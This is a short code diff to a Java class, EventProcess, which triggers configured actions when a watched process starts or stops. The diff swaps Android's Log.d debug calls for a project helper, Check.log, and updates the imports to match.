@@ -11,13 +11,12 @@ package com.android.service.event;
 
 import java.io.IOException;
 
-import android.util.Log;
-
 import com.android.service.ProcessInfo;
 import com.android.service.ProcessStatus;
 import com.android.service.auto.Cfg;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerProcess;
+import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.WChar;
 
@@ -58,7 +57,7 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 
 			name = WChar.getString(procName, true);
 		} catch (final IOException e) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: params FAILED");
+			if(Cfg.DEBUG) Check.log( TAG + " Error: params FAILED");
 
 			return false;
 		}
@@ -98,12 +97,12 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 	}
 
 	public void onEnter() {
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " (onEnter): triggering " + actionOnEnter + " " + name);
+		if(Cfg.DEBUG) Check.log( TAG + " (onEnter): triggering " + actionOnEnter + " " + name);
 		trigger(actionOnEnter);
 	}
 
 	public void onExit() {
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " (onExit): triggering " + actionOnExit + " " + name);
+		if(Cfg.DEBUG) Check.log( TAG + " (onExit): triggering " + actionOnExit + " " + name);
 		trigger(actionOnExit);
 	}
 }
